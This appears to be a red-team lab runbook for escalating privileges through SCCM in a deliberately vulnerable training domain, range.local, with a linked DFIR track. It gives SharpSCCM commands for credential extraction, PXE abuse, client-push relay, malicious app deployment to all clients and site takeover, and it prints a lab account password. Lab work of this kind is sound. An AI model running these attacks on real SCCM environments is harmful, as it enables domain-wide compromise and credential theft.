# CAMPAIGNS v3 — Branch C — SCCM Escalation (range.local)

> **Campaign v3** — read the theory here, run each command block live, then update [`CAMPAIGNS-METADATA-v2.md`](../CAMPAIGNS-METADATA-v2.md).
> **Index:** [`CAMPAIGNS-RUNBOOK-README.md`](CAMPAIGNS-RUNBOOK-README.md) · **Full reference:** [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) · **Topology:** [`archive/CAMPAIGNS.md`](../archive/CAMPAIGNS.md)
> **DFIR track:** [`DFIR-Nexus-Pioneer-workflow.md`](../DFIR-Nexus-Pioneer-workflow.md)
>
> **Sync rule:** When you change this runbook during lab work, apply the same edit to [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) (matching section). Re-run `python tools/split-campaign-runbooks.py --check` to verify coverage.

**Default host:** Kali / provisioning (`192.168.77.60`) unless a step says otherwise.

---

### Branch C: SCCM Escalation (range.local)


**Diverges from:** Phase 8 (cross-forest access gives `svc_sccm`).
**Converges to:** Phase 8 (NAA extraction gives range.local DA).
**SCCM Site Server:** mbr02 (192.168.77.23) — site code `CAD`.

`svc_sccm` is SCCM Full Administrator on the `CAD` site. From this position:

> **Verification note (2026-08-01 — deep):** WT034 NAA verified (vault bait → `RANGE\svc_naa` = DA) + confirmed in provider. Deep surface validated as `range\svc_sccm` via SMS Provider WMI (explicit creds, ws01): local `SMS Admins` membership (incl. cross-forest `CADRE\chief_command`/`analyst_purple`), PXE approved cert + 2 boot images, NAA-in-policy, client-push component enabled, `SMS_Scripts.CreateScripts` + `SMS_Package`/`SMS_Program` (SYSTEM) creation work. **Root-caused blocker:** the **AdminService is NOT deployed on mbr02** (no IIS app pool, no `/AdminService` web app, no `bin\AdminService`) → CMPivot (WT037) / script-run (WT039) have no target. The `HTTP/mbr02.range.local` SPN on `svc_sccm` + `msDS-AllowedToDelegateTo=HTTP/mbr02.range.local` (CD, intentional in `05-ad-attack-surface.yml`) is **correct**; intended path = post-Kerberoast S4U2Self→S4U2Proxy to HTTP/mbr02 → AdminService, with the **AdminService app pool running as `RANGE\svc_sccm`** (SPN owner — required to decrypt the CD ticket). **Fix: `docs/sccm-integration-guide.md` Phase 6A (deploy AdminService + pool identity) + verify checks in `10-sccm-verify.yml`.** `SMS_Advertisement.Put` = Generic failure via raw WMI (console needed) → WT038/039 full exec via console/CD. **`cifs/mbr02.range.local` SPN missing** → SMB Kerberos to mbr02 broken (verify-playbook candidate). SharpSCCM v2.0.13 uses `-mp`/`-sms` (not v1 `-s`); `get naa`/`get secrets` need a computer account (or PXE cert+media GUID), not a user logon; `get`/`exec` use current session token (no `-u/-p`) — replicate with PowerShell WMI + explicit creds (proven). Test objects cleaned up; provisioning restored.

#### NAA Credential Extraction (WT034) — Fastest to DA

```powershell
SharpSCCM.exe get naa -s mbr02.range.local
# Returns: RANGE\svc_naa : N@A_s3rv1c3!  (svc_naa is Domain Admin)
# NOTE (v2.0.13): get naa/get secrets = same command, requires a COMPUTER ACCOUNT (or PXE cert -c + media GUID -m), not a user logon. WT034 verified via vault bait file instead.
```

#### Full SCCM Attack Chain (WT034–039 — Plan 1.1 first-class)

> **Do not stop at NAA.** Automate/verify WT035–039 as Branch C graph nodes (SharpSCCM staged via **ws01** primary path; P-FOREST VMs required).

| WT# | Attack            | Command                                                 | What it does                     | Plan 1.1 |
| --- | ----------------- | ------------------------------------------------------- | -------------------------------- | -------- |
| 034 | NAA Extraction    | `SharpSCCM.exe get naa -s mbr02.range.local`            | `RANGE\svc_naa` DA creds         | Spine P8 + Branch C |
| 035 | PXE Boot Abuse    | `SharpSCCM get pxe -s mbr02`                            | Extract boot image + creds       | Branch C |
| 036 | Client Push Relay | `SharpSCCM client-push -s mbr02 -t 192.168.77.22`       | Relay to SMB target              | Branch C |
| 037 | CMPivot Abuse     | `SharpSCCM invoke cmpivot -s mbr02 -q "..."`            | Arbitrary queries on all clients | Branch C |
| 038 | App Deployment    | `SharpSCCM exec -s mbr02 -t all -c "..."`               | Deploy malicious app to all      | Branch C |
| 039 | Site Takeover     | `SharpSCCM invoke script -s mbr02 -t mbr02 -c "whoami"` | Execute on site server           | Branch C (HITL gate) |


#### Additional Auxiliary Attacks


| WT# | Attack         | Relevant Domain                         |
| --- | -------------- | --------------------------------------- |
| 030 | WSUS Abuse     | range.local                             |
| 049 | VSC Enrollment | Certificate enrollment via VSC template |


---

---

## Navigation

← Previous: [`CAMPAIGNS-RUNBOOK-branch-b.md`](CAMPAIGNS-RUNBOOK-branch-b.md) · Next: [`CAMPAIGNS-RUNBOOK-branch-d.md`](CAMPAIGNS-RUNBOOK-branch-d.md) →
